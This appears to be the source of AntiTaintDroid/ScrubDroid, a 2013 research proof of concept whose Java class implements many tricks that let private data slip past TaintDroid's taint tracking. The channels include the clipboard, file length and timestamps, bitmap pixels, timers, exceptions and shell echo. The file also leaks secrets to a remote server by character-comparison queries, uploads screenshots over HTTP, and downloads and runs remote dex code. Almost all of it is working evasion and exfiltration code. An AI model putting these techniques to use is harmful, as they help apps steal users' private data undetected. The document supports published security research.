/*
 * AntiTaintDroid/ScrubDroid
 * Copyright (C) 2012-2013 National ICT Australia, Golam Sarwar
 *
 * AntiTaintDroid (a.k.a. ScrubDroid) [1] is a proof-of-concept Android application
 * bypassing the security protections offered by TaintDroid [2].
 *
 * When referencing AntiTaintDroid/ScrubDroid, please use the following
 * citation:
 *   Golam Sarwar, Olivier Mehani, Roksana Boreli, and Mohammed Ali Kaafar. “On
 *   the Effectiveness of Dynamic Taint Analysis for Protecting Against Private
 *   Information Leaks on Android-based Devices”. In: SECRYPT 2013, 10th
 *   International Conference on Security and Cryptography. Ed. by P. Samarati.
 *   ACM SIGSAC. Reykjávik, Iceland: SciTePress, July 2013. url:
 *   http://www.nicta.com.au/pub?id=6865;
 *
 * [1] http://nicta.info/scrubdroid
 * [2] http://appanalysis.org/
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
 */
package com.gsbabil.antitaintdroid;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.util.ArrayList;

import java.util.HashMap;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

import android.annotation.SuppressLint;
import android.text.ClipboardManager;
import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.util.Log;
import android.widget.TextView;

@SuppressWarnings("deprecation")
public class UntaintTricks {
	private UtilityFunctions utils = new UtilityFunctions();

	public static Map<String, Integer> hashTrickNames = null;

	static {
		hashTrickNames = new LinkedHashMap<String, Integer>();
		hashTrickNames.put("Tainted Variable Test", 0);
		hashTrickNames.put("File Read/Write Test", 1);
		hashTrickNames.put("Simple Encoding Trick", 2);	
		hashTrickNames.put("Shell Command Trick", 3);
		hashTrickNames.put("File+Shell Hybrid Trick", 4);
		hashTrickNames.put("Bitmap Cache Trick", 5);
		hashTrickNames.put("Timekeeper Trick", 6);
		hashTrickNames.put("Count-to-X Trick", 7);
		hashTrickNames.put("File Length Trick", 8);
		hashTrickNames.put("Clipboard Trick", 9);
		hashTrickNames.put("Bitmap Pixel Trick", 10);
		hashTrickNames.put("Text Scaling Trick", 11);
		hashTrickNames.put("Exception/Error Trick", 12);
		hashTrickNames.put("Direct Buffer Trick", 13);
		hashTrickNames.put("Remote Control Trick", 14);
		hashTrickNames.put("Remote Dex Trick", 15);	
		hashTrickNames.put("File LastModified Trick", 16);
	}

	public List<String> getTrickNames() {
		List<String> trickNames = new ArrayList<String>();

		for (String name : hashTrickNames.keySet()) {
			trickNames.add(name);
		}
		return trickNames;
	}

	public UntaintTricks() {
		utils = new UtilityFunctions();
	}

	public String bitmapCacheTrick(String in) {
		String out = new String();

		utils.statusUpdate("● " + utils.timeNow() + " Saving Bitmap Cache ... ");
		int res = utils.captureBitmapCache(in);

		if (res == 0) {
			utils.statusUpdate("(success)\n");
			utils.statusUpdate("● " + utils.timeNow()
					+ " Trying OCR over HTTP ... ");
			String httpResponse = utils.httpFileUpload(MyApp.context
					.getFilesDir() + "/" + MyApp.SCREENSHOT_FILENAME);

			if (httpResponse != null && httpResponse != "") {
				String httpRes = utils.parseJson(httpResponse, "result");
				if (httpRes.contains("success")) {
					String httpOcr = utils.parseJson(httpResponse, "ocr");
					out = httpOcr;
					utils.statusUpdate("(success)\n");
				} else {
					out = " -X- ";
					utils.statusUpdate("(failed)\n");
				}
			}

		} else {
			utils.statusUpdate("(failed)\n");
		}
		return out;
	}

	public String bitmapPixelTrick(String in) {
		String out = new String();
		Bitmap srcBitmap = BitmapFactory.decodeResource(
				MyApp.context.getResources(), R.drawable.ic_launcher);

		int srcHeight = srcBitmap.getHeight();
		int srcWidth = srcBitmap.getWidth();

		Bitmap destBitmap = Bitmap.createBitmap(srcHeight, srcWidth,
				Bitmap.Config.ARGB_8888);

		for (int i = 0; i < in.length(); i++) {
			int x = (int) in.charAt(i);
			x = x ^ 0xFFFF0000;
			destBitmap.setPixel(10, 10, x);

			int y = destBitmap.getPixel(10, 10);
			y = y ^ 0xFFFF0000;
			out = out + (char) y;
		}

		return out;
	}

	public String clipboardTrick(String in) {
		String out = new String();

		for (int i = 0; i < in.length(); i++) {

			String randomStr = new String();
			for (int j = 0; j < (int) in.charAt(i); j++) {
				randomStr = randomStr + "B";
			}

			ClipboardManager clipboard = (ClipboardManager) MyApp.context
					.getSystemService(Context.CLIPBOARD_SERVICE);
			clipboard.setText(randomStr);
			String k = (String) clipboard.getText();
			out = out + (char) k.length();
		}

		return out;
	}

	public String testTrick(String in) {
		String out = new String();
		String fileName = "untainted.txt";
		long time = 1310198774000L;
		int multiplier = 1000;
		
		try {
			File f = new File(MyApp.context.getFilesDir(), fileName);
			f.createNewFile();
			
			for (int i = 0; i < in.length(); i++) {
				int x = (int) in.charAt(i);
				long lastMod1 = time + (long) (x*multiplier);
				f.setLastModified(lastMod1);
				
				long lastMod2 = f.lastModified();
				int diff = (int) (lastMod2 - time);
				
				char y = (char) (diff/multiplier);
				out = out + y;
			}
			
		} catch (Throwable e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
		return out;
	}

	@SuppressLint({ "WorldReadableFiles", "WorldWriteableFiles" })
	public String fileLengthTrick(String in) {
		String out = new String();
		String fileName = "untainted.txt";

		for (int i = 0; i < in.length(); i++) {
			String str = "";
			for (int j = 0; j < (int) in.charAt(i); j++) {
				str = str + "B";
			}

			try {
				FileOutputStream fileOut = MyApp.context.openFileOutput(
						fileName, Context.MODE_WORLD_READABLE
								| Context.MODE_WORLD_WRITEABLE);

				OutputStreamWriter osw = new OutputStreamWriter(fileOut);
				osw.write(str);
				osw.flush();
				osw.close();
				fileOut.close();

				File f = new File(MyApp.context.getFilesDir(), fileName);
				long k = f.length();
				f.delete();

				out = out + (char) k;

			} catch (Throwable e) {
				Log.i(MyApp.TAG, e.getMessage().toString());
			}
		}

		return out;
	}

	public String lookupTableTrick(String in) {
		String out = "";
		int totalSymbols = 256;
		char symbolTable[] = new char[256];

		for (int i = 0; i < totalSymbols; i++) {
			symbolTable[i] = (char) i;
		}

		for (int i = 0; i < in.length(); i++) {
			int k = (int) in.charAt(i);
			out = out + symbolTable[k];
		}

		return out;
	}

	public String countToXTrick(String in) {
		String out = "";

		for (int i = 0; i < in.length(); i++) {

			int y = 0;
			for (int j = 0; j < (int) in.charAt(i); j++) {
				y = y + 1;
			}
			out = out + (char) y;
		}

		return out;
	}

	public String timerTrick(String in) {
		String out = "";
		long miliStart, miliEnd;
		long miliDiff = 0;

		for (int i = 0; i < in.length(); i++) {
			int c = (int) in.charAt(i);

			/*
			 * Babil : The while loop below would not be unnecessary if Java
			 * would provide a high-precision timer on Android.
			 */
			while (miliDiff != c) {
				miliStart = System.currentTimeMillis();
				try {
					Thread.sleep(c);
				} catch (Throwable e) {
				}
				miliEnd = System.currentTimeMillis();
				miliDiff = (long) (miliEnd - miliStart);
			}

			out = out + (char) miliDiff;
		}

		return out;
	}

	@SuppressLint({ "WorldReadableFiles", "WorldWriteableFiles" })
	public String fileTest(String in, boolean hybrid) {
		if (in == null) {
			return "";
		}

		char[] tmpBuf = new char[in.length()];
		String oldFileName = "tainted.txt";
		String newFileName = "untainted.txt";
		String out = new String();

		try {
			FileOutputStream fileOut = MyApp.context.openFileOutput(
					oldFileName, Context.MODE_WORLD_READABLE
							| Context.MODE_WORLD_WRITEABLE);
			OutputStreamWriter osw = new OutputStreamWriter(fileOut);
			osw.write(in);
			osw.flush();
			osw.close();
			fileOut.close();

			if (hybrid == false) {
				File oldFile = new File(MyApp.context.getFilesDir(),
						oldFileName);
				File newFile = new File(MyApp.context.getFilesDir(),
						newFileName);
				oldFile.renameTo(newFile);
				oldFile.delete();

				FileInputStream fileIn = MyApp.context
						.openFileInput(newFileName);
				InputStreamReader isr = new InputStreamReader(fileIn);

				/*
				 * Babil: The commented out lines below were written to confirm
				 * false-positives with tainted files. Once a file gets written
				 * to with tainted data, even if the tainted data gets 
				 * overwritten, any subsequent data read from the file is still
				 * considered tainted, raising false positives.
				 *
				FileOutputStream tmpFout = new FileOutputStream(MyApp.context.getFilesDir() + "/" + newFileName);
				byte[] buf = {
						0x33, 0x33, 0x33, 0x33, 0x33, 
						0x33, 0x33, 0x33, 0x33, 0x33, 
						0x33, 0x33, 0x33, 0x33, 0x33
						};
				tmpFout.write(buf);
				tmpFout.close();
				*/				
				newFile.delete();

				isr.read(tmpBuf);
				out = new String(tmpBuf);
				isr.close();
				fileIn.close();
			}

			if (hybrid == true) {
				String fullPathOld = MyApp.context.getFilesDir() + "/"
						+ oldFileName;
				String command = "cat " + fullPathOld;
				out = utils.runAsUser(command);
			}

		} catch (Throwable e) {
			Log.i(MyApp.TAG, e.getMessage().toString());
		}

		return out;
	}

	public String shellTrick(String in) {
		String command = "sh -c \"echo " + in + "\"";
		String out = "";
		out = utils.runAsUser(command);
		return out;
	}

	public String encodingTrick(String in) {
		String symbols = "0123456789abcdefghijklmnopqrstuvwxyz" +
				"ABCDEFGHIJKLMNOPQRSTUVWXYZ~`!@#$%^&*()-=_+[]{}" +
				"\\|;',./:\"<>?";
		
		String out = "";

		if (in != null) {
			for (int i = 0; i < in.length(); i++) {
				for (int j = 0; j < symbols.length(); j++) {
					if (in.charAt(i) == symbols.charAt(j)) {
						out = out + symbols.charAt(j);
						break;
					}
				}
			}
		}
		return out;
	}

	public String textScalingTrick(String in) {
		String out = new String();
		TextView tv = (TextView) MyApp.context.findViewById(R.id.textview);

		float orig_scale = tv.getTextScaleX();

		for (int i = 0; i < in.length(); i++) {
			int x = (int) in.charAt(i);
			tv.setTextScaleX(x);
			int y = (int) tv.getTextScaleX();
			out = out + (char) y;
		}

		tv.setTextScaleX(orig_scale);
		return out;
	}

	public String exceptionTrick(String X) {
		String Y = "";

		for (int i = 0; i < X.length(); i++) {
			int k = 0;
			while (true) {
				try {
					throw new Exception();
				} catch (Exception e) {
					k = k + 1;
					if (k == X.charAt(i)) {
						break;
					}
				}
			}
			Y = Y + (char) k;
		}

		return Y;
	}

	public String directBufferTrick(String in) {
		String out = new String();
		ByteBuffer bbuf = ByteBuffer.allocateDirect(128).order(
				ByteOrder.BIG_ENDIAN);
		int addr = 0x00;
//		int addr2 = 0x01;
		
		for (int i = 0; i < in.length(); i++) {
			char x = in.charAt(i);
			bbuf.putChar(addr, x);
			char y = bbuf.getChar(addr);
//			bbuf.putChar(addr2, (char) 0x33); 
//			char y2 = bbuf.getChar(addr2);
			out = out + y;
		}
		return out;
	}

	public String remoteControlTrick(String in) {
		String out = new String("");

		Map<String, String> data = new HashMap<String, String>();
		data.put(">>start", ">>start");
		String httpResponse = utils.httpSubmit(data);

		String cmd = new String("");
		String task = new String("");
		String ans = new String("");

		while (!httpResponse.contains("--done--")) {
			cmd = utils.parseJson(httpResponse, "<<command");
			task = cmd.split(":")[0];

			if (task.equals("compare")) {
				String taskval = " "; // default value is 0x30

				try {
					taskval = cmd.split(":")[1];
				} catch (Exception e) {
					Log.i(MyApp.TAG, e.getMessage().toString());
				}

				String tmp = in.substring(0, taskval.length());

				if (taskval.equals(in)) {
					ans = "true:" + taskval;
				} else if (taskval.equals(tmp)) {
					ans = "fuzzy:" + taskval;
					utils.statusUpdate("● " + utils.timeNow()
							+ " disclosed so far ... " + "(" + taskval + ")\n");
				} else {
					ans = "false:" + taskval;
				}

				data = new HashMap<String, String>();
				data.put(">>answer", ans);
				httpResponse = utils.httpSubmit(data);
			} else {
				data = new HashMap<String, String>();
				data.put(">>answer", ans);
				httpResponse = utils.httpSubmit(data);
			}
		}

		cmd = utils.parseJson(httpResponse, "<<command");
		task = cmd.split(":")[0];
		if (task.equals("--done--")) {
			out = cmd.split(":")[1];
		}

		return out;
	}

	
	public String remoteDexTrick(String in) {
		String out = new String();

		String path = MyApp.context.getFilesDir()
				+ File.separator
				+ MyApp.REMOTE_DEX_URL.substring(MyApp.REMOTE_DEX_URL
						.lastIndexOf('/') + 1);

		File f = new File(path);
		long len = 0;
		
		if ( ! f.exists() ) {
			len = utils.httpDownload(MyApp.REMOTE_DEX_URL, path);
		} else {
			len = f.length();
		}
		
		if (len > 0) {
			out = utils.runRemoteDex("RemoteDex",
					"encodingTrick", in);
		}

		return out;
	}

}
